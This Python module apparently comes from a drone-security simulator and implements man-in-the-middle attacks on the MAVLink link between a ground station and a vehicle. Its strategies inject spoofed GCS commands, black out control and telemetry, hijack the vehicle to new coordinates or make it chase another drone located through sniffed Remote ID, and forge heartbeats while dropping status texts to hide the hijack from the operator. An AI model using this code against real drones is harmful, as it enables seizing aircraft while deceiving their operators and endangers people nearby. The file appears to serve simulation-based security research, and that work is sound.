"""Pluggable man-in-the-middle strategies.

A strategy decides what happens to each message the MITM intercepts on the two
primary directions of the GCS<->vehicle link:

- ``on_downlink``  — telemetry travelling Logic -> GCS
- ``on_uplink``    — commands travelling GCS -> Logic

Each hook returns the (possibly modified) message to forward it, or ``None`` to
drop it. Strategies may also *inject* their own messages via the
:class:`MITMContext` handed to :meth:`MITMStrategy.bind` at startup.

The default :class:`PassthroughStrategy` forwards everything unchanged. New
attacks subclass :class:`MITMStrategy` and register with
:func:`register_strategy`; the notebook selects one by name and supplies params.
"""

from __future__ import annotations

import logging
import math
import threading

from pymavlink.dialects.v20 import ardupilotmega as mavlink

from simulator.entities.riddata import RIDData
from simulator.helpers.connections import MAVConnection
from simulator.runtime.mitm.rid_sniffer import RIDSniffer

MAVMsg = mavlink.MAVLink_message
Params = dict[str, float]


class MITMContext:
    """Handle that lets a strategy inject MAVLink into the proxied links.

    The MITM owns the two outbound connections; a strategy uses this context to
    originate messages (spoofing, command injection) rather than only
    transforming messages that happen to pass through. ``port_offset`` is the
    victim vehicle's per-UAV port offset, letting a strategy locate the victim's
    ZMQ feeds (e.g. its ``RID_DOWN`` Remote ID stream).
    """

    def __init__(
        self,
        sysid: int,
        port_offset: int,
        to_logic: MAVConnection,
        to_gcs: MAVConnection,
    ) -> None:
        self.sysid = sysid
        self.port_offset = port_offset
        self._to_logic = to_logic
        self._to_gcs = to_gcs
        # Encoder used to pack injected messages. srcSystem 255 makes injected
        # commands look like they came from the real GCS.
        self._encoder = mavlink.MAVLink(None, srcSystem=255, srcComponent=200)
        self._lock = threading.Lock()

    def inject_to_logic(self, msg: MAVMsg) -> None:
        """Send an attacker-originated message toward the vehicle's Logic."""
        with self._lock:
            self._to_logic.write(msg.pack(self._encoder))

    def inject_to_gcs(self, msg: MAVMsg) -> None:
        """Send an attacker-originated message toward the GCS."""
        with self._lock:
            self._to_gcs.write(msg.pack(self._encoder))


class MITMStrategy:
    """Base strategy: transparent passthrough in both directions."""

    def __init__(self, params: Params | None = None) -> None:
        self.params: Params = dict(params or {})
        self.ctx: MITMContext | None = None

    def bind(self, ctx: MITMContext) -> None:
        """Receive the injection context once, before relays start."""
        self.ctx = ctx

    def start(self) -> None:
        """Start any background activity. Called once after relays start."""

    def stop(self) -> None:
        """Stop background activity and release resources. Called on shutdown."""

    def on_downlink(self, msg: MAVMsg) -> MAVMsg | None:
        """Handle a telemetry message travelling Logic -> GCS."""
        return msg

    def on_uplink(self, msg: MAVMsg) -> MAVMsg | None:
        """Handle a command message travelling GCS -> Logic."""
        return msg


class PassthroughStrategy(MITMStrategy):
    """Forward every message unmodified (default)."""


class StealthModeMask:
    """Hides an attacker-induced flight-mode change from the GCS.

    The giveaway of a man-in-the-middle hijack is the vehicle's ``HEARTBEAT``
    reporting a new ``custom_mode`` (e.g. ArduCopter AUTO ``3`` -> GUIDED ``4``)
    once the attacker switches it to GUIDED. Dropping ``HEARTBEAT`` outright
    would stall the GCS (it blocks on ``wait_heartbeat`` and treats the link as
    dead), so instead this mask *rewrites* the mode fields on downlink heartbeats
    back to the last mode the vehicle reported before the hijack fired.

    A second, firmware-dependent tell is the ``STATUSTEXT`` some autopilots emit
    on a mode change (ArduPlane and some copter configs announce the new mode by
    name, e.g. ``"GUIDED"``). ArduCopter SITL in the default config does not emit
    one — the heartbeat mask alone hides the switch there — but to stay airtight
    across firmwares the mask also *drops* any downlink ``STATUSTEXT`` that names
    the hijack mode once engaged (``hijack_mode_name``).

    Conceptually this is the downlink analogue of the uplink
    :data:`~simulator.runtime.vehicle.gcs_cmd_forwarder.GCS_FORWARD_TYPES`
    allowlist: rather than selecting which message *types* pass, it scrubs the
    fields (and drops the texts) within always-forwarded types that would betray
    the attack.

    Usage: feed every downlink message to :meth:`observe` while inactive to keep
    the cover mode current, call :meth:`engage` the moment the hijack fires, and
    route every subsequent downlink message through :meth:`mask` thereafter
    (which returns ``None`` for a message that must be dropped).
    """

    def __init__(self, hijack_mode_name: str | None = None) -> None:
        # Encoder used to re-pack the rewritten heartbeat. srcSystem is set from
        # the observed heartbeat so the forged beacon keeps the vehicle's id.
        self._encoder = mavlink.MAVLink(None, srcComponent=200)
        # Uppercased name of the mode the attacker switches into; any STATUSTEXT
        # mentioning it is a mode-change announcement that would leak the hijack.
        self._hijack_mode_name = hijack_mode_name.upper() if hijack_mode_name else None
        self._active = False
        self._cover_base_mode: int | None = None
        self._cover_custom_mode: int | None = None

    def observe(self, msg: MAVMsg) -> None:
        """Record the latest pre-hijack mode from a benign heartbeat."""
        if self._active or msg.get_type() != "HEARTBEAT":
            return
        self._cover_base_mode = int(msg.base_mode)
        self._cover_custom_mode = int(msg.custom_mode)

    def engage(self) -> None:
        """Freeze the current cover mode and start masking subsequent heartbeats."""
        self._active = True
        logging.info(
            "MITM stealth: masking flight mode as base=%s custom=%s",
            self._cover_base_mode,
            self._cover_custom_mode,
        )

    def mask(self, msg: MAVMsg) -> MAVMsg | None:
        """Scrub a downlink message so it cannot betray the hijack.

        Returns the (possibly rewritten) message to forward it, or ``None`` to
        drop it. While inactive, every message passes untouched. Once engaged:

        - a ``HEARTBEAT`` whose mode diverges from the cover mode is re-encoded
          with the frozen cover mode (one matching the cover mode passes as-is);
        - a ``STATUSTEXT`` that names the hijack mode is dropped;
        - every other message passes untouched.
        """
        if not self._active:
            return msg
        msg_type = msg.get_type()
        if msg_type == "STATUSTEXT":
            return None if self._names_hijack_mode(msg) else msg
        if msg_type != "HEARTBEAT":
            return msg
        if (
            self._cover_custom_mode is None
            or self._cover_base_mode is None
            or (
                msg.custom_mode == self._cover_custom_mode
                and msg.base_mode == self._cover_base_mode
            )
        ):
            return msg
        self._encoder.srcSystem = msg.get_srcSystem()
        forged = self._encoder.heartbeat_encode(
            msg.type,
            msg.autopilot,
            self._cover_base_mode,
            self._cover_custom_mode,
            msg.system_status,
            msg.mavlink_version,
        )
        # Clear any cached raw buffer so the relay re-packs the rewritten fields.
        forged._msgbuf = None
        return forged

    def _names_hijack_mode(self, msg: MAVMsg) -> bool:
        """True if a STATUSTEXT announces the hijack mode (and must be dropped)."""
        if self._hijack_mode_name is None:
            return False
        text = str(getattr(msg, "text", "")).upper()
        if self._hijack_mode_name not in text:
            return False
        logging.info("MITM stealth: dropping mode-change STATUSTEXT %r", msg.text)
        return True


class BlackoutStrategy(MITMStrategy):
    """Blind the GCS: drop all commands and all telemetry.

    To avoid deadlocking the simulation, the attacker keeps the link *looking*
    alive: ``HEARTBEAT`` (the GCS blocks on ``wait_heartbeat`` at startup) and
    the ``LOGIC_DONE`` completion signal are still forwarded. Everything else —
    position, mission state, attitude, and all GCS commands — is suppressed.
    """

    #: Downlink message types always forwarded so the sim can run/terminate.
    _ALLOW_DOWNLINK: frozenset[str] = frozenset({"HEARTBEAT", "STATUSTEXT"})

    def on_downlink(self, msg: MAVMsg) -> MAVMsg | None:
        msg_type = msg.get_type()
        if msg_type == "HEARTBEAT":
            return msg
        # Let the LOGIC_DONE completion handshake through; drop other statustext.
        if msg_type == "STATUSTEXT" and getattr(msg, "text", "") == "LOGIC_DONE":
            return msg
        return None

    def on_uplink(self, msg: MAVMsg) -> MAVMsg | None:
        return None  # the GCS cannot reach the vehicle


class HijackStrategy(MITMStrategy):
    """Attacker-driven intervention.

    Watches ``MISSION_CURRENT`` on the relayed telemetry and, once
    ``seq >= trigger_seq``, injects ``SET_MODE(GUIDED)`` + ``DO_REPOSITION``
    toward the vehicle — the same redirect the GCS performed, but originated by
    the man-in-the-middle and spoofed to look like it came from the GCS.

    Params: ``trigger_seq`` (default 1), ``target_lat``, ``target_lon``,
    ``target_alt``, ``stealth`` (default 1: mask the GUIDED-mode switch from the
    GCS; set 0 for a visible hijack).
    """

    _GUIDED_CUSTOM_MODE = 4  # ArduCopter GUIDED
    _GUIDED_MODE_NAME = "GUIDED"  # name scrubbed from mode-change STATUSTEXTs

    def __init__(self, params: Params | None = None) -> None:
        super().__init__(params)
        self.trigger_seq = int(self.params.get("trigger_seq", 1))
        self.target_lat = float(self.params.get("target_lat", 0.0))
        self.target_lon = float(self.params.get("target_lon", 0.0))
        self.target_alt = float(self.params.get("target_alt", 0.0))
        self.stealth = bool(self.params.get("stealth", 1.0))
        self._fired = False
        self._mode_mask = StealthModeMask(hijack_mode_name=self._GUIDED_MODE_NAME)
        # Builder used only to construct message objects (packed by the context).
        self._builder = mavlink.MAVLink(None, srcSystem=255, srcComponent=200)

    def on_downlink(self, msg: MAVMsg) -> MAVMsg | None:
        if not self._fired:
            self._mode_mask.observe(msg)
            if msg.get_type() == "MISSION_CURRENT" and msg.seq >= self.trigger_seq:
                self._inject_reposition()
                self._fired = True
                if self.stealth:
                    self._mode_mask.engage()
        # Telemetry still flows to the GCS; under stealth the GUIDED-mode switch
        # is scrubbed from heartbeats so the hijack is not betrayed.
        return self._mode_mask.mask(msg) if self.stealth else msg

    def _inject_reposition(self) -> None:
        if self.ctx is None:
            logging.error("HijackStrategy not bound to a MITMContext; cannot inject")
            return
        sysid = self.ctx.sysid
        logging.info(
            "MITM hijack: redirecting vehicle %s to (%.7f, %.7f, %.1f)",
            sysid,
            self.target_lat,
            self.target_lon,
            self.target_alt,
        )
        set_mode = self._builder.set_mode_encode(
            sysid,
            mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            self._GUIDED_CUSTOM_MODE,
        )
        self.ctx.inject_to_logic(set_mode)
        reposition = self._builder.command_int_encode(
            sysid,
            1,  # autopilot component
            mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT,
            mavlink.MAV_CMD_DO_REPOSITION,
            0,  # current
            0,  # autocontinue
            -1.0,  # param1: speed, no change
            1.0,  # param2: MAV_DO_REPOSITION_FLAGS_CHANGE_MODE
            0.0,  # param3
            math.nan,  # param4: yaw, no change
            int(self.target_lat * 1e7),
            int(self.target_lon * 1e7),
            self.target_alt,
        )
        self.ctx.inject_to_logic(reposition)


class HijackPursuitStrategy(MITMStrategy):
    """Attacker-driven pursuit: steer the victim to chase another vehicle.

    Mirrors :class:`~simulator.planner.plans.pursuit.PursuitPlan`, but the guided
    setpoints originate from the man-in-the-middle rather than a cooperative
    plan. On trigger the attacker switches the victim to GUIDED and then, in a
    background loop, streams ``SET_POSITION_TARGET_GLOBAL_INT`` toward the
    target's most recently overheard Remote ID position. The attacker learns the
    target's position passively via :class:`RIDSniffer` — it overhears the same
    Remote ID feed the victim's own logic receives, so the Oracle needs no
    changes.

    Params: ``target_sysid`` (vehicle to pursue), ``trigger_seq`` (default 1;
    fires once ``MISSION_CURRENT.seq >= trigger_seq``), ``update_interval``
    (seconds between setpoints, default 1.0), ``stealth`` (default 1: mask the
    GUIDED-mode switch from the GCS; set 0 for a visible hijack).

    Note: the target's Remote ID only reaches the victim's feed while the two are
    within the Oracle's transmission range — the same constraint the cooperative
    pursuit lives under.
    """

    _GUIDED_CUSTOM_MODE = 4  # ArduCopter GUIDED
    _GUIDED_MODE_NAME = "GUIDED"  # name scrubbed from mode-change STATUSTEXTs
    _POSITION_TYPE_MASK = 0b110111111000  # position only (ignore vel/accel/yaw)

    def __init__(self, params: Params | None = None) -> None:
        super().__init__(params)
        self.target_sysid = int(self.params.get("target_sysid", 0))
        self.trigger_seq = int(self.params.get("trigger_seq", 1))
        self.update_interval = float(self.params.get("update_interval", 1.0))
        self.stealth = bool(self.params.get("stealth", 1.0))
        self._fired = False
        self._mode_mask = StealthModeMask(hijack_mode_name=self._GUIDED_MODE_NAME)
        self._stop = threading.Event()
        self._sniffer: RIDSniffer | None = None
        self._pursue_thread: threading.Thread | None = None
        # Builder used only to construct message objects (packed by the context).
        self._builder = mavlink.MAVLink(None, srcSystem=255, srcComponent=200)

    def bind(self, ctx: MITMContext) -> None:
        super().bind(ctx)
        self._sniffer = RIDSniffer(ctx.port_offset)

    def start(self) -> None:
        if self._sniffer is not None:
            self._sniffer.start()

    def on_downlink(self, msg: MAVMsg) -> MAVMsg | None:
        if not self._fired:
            self._mode_mask.observe(msg)
            if msg.get_type() == "MISSION_CURRENT" and msg.seq >= self.trigger_seq:
                self._begin_pursuit()
                self._fired = True
                if self.stealth:
                    self._mode_mask.engage()
        # Telemetry still flows to the GCS; under stealth the GUIDED-mode switch
        # is scrubbed from heartbeats so the hijack is not betrayed.
        return self._mode_mask.mask(msg) if self.stealth else msg

    def _begin_pursuit(self) -> None:
        if self.ctx is None:
            logging.error("HijackPursuitStrategy not bound; cannot inject")
            return
        logging.info(
            "MITM hijack-pursuit: vehicle %s → pursuing sysid %s",
            self.ctx.sysid,
            self.target_sysid,
        )
        set_mode = self._builder.set_mode_encode(
            self.ctx.sysid,
            mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            self._GUIDED_CUSTOM_MODE,
        )
        self.ctx.inject_to_logic(set_mode)
        self._pursue_thread = threading.Thread(target=self._pursue_loop, daemon=True)
        self._pursue_thread.start()

    def _pursue_loop(self) -> None:
        while not self._stop.is_set():
            if self._sniffer is not None:
                rid = self._sniffer.latest(self.target_sysid)
                if rid is not None:
                    self._inject_target(rid)
                else:
                    logging.debug(
                        "MITM hijack-pursuit: no RID yet for sysid %s",
                        self.target_sysid,
                    )
            self._stop.wait(self.update_interval)

    def _inject_target(self, rid: RIDData) -> None:
        if self.ctx is None:
            return
        lat_e7, lon_e7, alt_m = rid.gra_pos.to_global_int_alt_in_meters()
        logging.info(
            "MITM hijack-pursuit: redirecting vehicle %s to target %s at "
            "(%.7f, %.7f, %.1f)",
            self.ctx.sysid,
            self.target_sysid,
            rid.gra_pos.lat,
            rid.gra_pos.lon,
            alt_m,
        )
        setpoint = self._builder.set_position_target_global_int_encode(
            10,  # time_boot_ms
            self.ctx.sysid,  # target_system
            1,  # target_component (autopilot)
            mavlink.MAV_FRAME_GLOBAL_INT,
            self._POSITION_TYPE_MASK,
            lat_e7,
            lon_e7,
            alt_m,
            0, 0, 0,  # vx, vy, vz
            0, 0, 0,  # afx, afy, afz
            0, 0,  # yaw, yaw_rate
        )
        self.ctx.inject_to_logic(setpoint)

    def stop(self) -> None:
        self._stop.set()
        if self._pursue_thread is not None:
            self._pursue_thread.join(timeout=1.0)
        if self._sniffer is not None:
            self._sniffer.stop()


_STRATEGIES: dict[str, type[MITMStrategy]] = {
    "passthrough": PassthroughStrategy,
    "blackout": BlackoutStrategy,
    "hijack": HijackStrategy,
    "hijack_pursuit": HijackPursuitStrategy,
}


def register_strategy(name: str, strategy: type[MITMStrategy]) -> None:
    """Register a strategy class under ``name`` so it is selectable by config."""
    _STRATEGIES[name] = strategy


def get_strategy(name: str, params: Params | None = None) -> MITMStrategy:
    """Instantiate the strategy registered under ``name`` (falls back to passthrough)."""
    strategy_cls = _STRATEGIES.get(name)
    if strategy_cls is None:
        logging.warning("Unknown MITM strategy %r; falling back to passthrough", name)
        strategy_cls = PassthroughStrategy
    return strategy_cls(params)
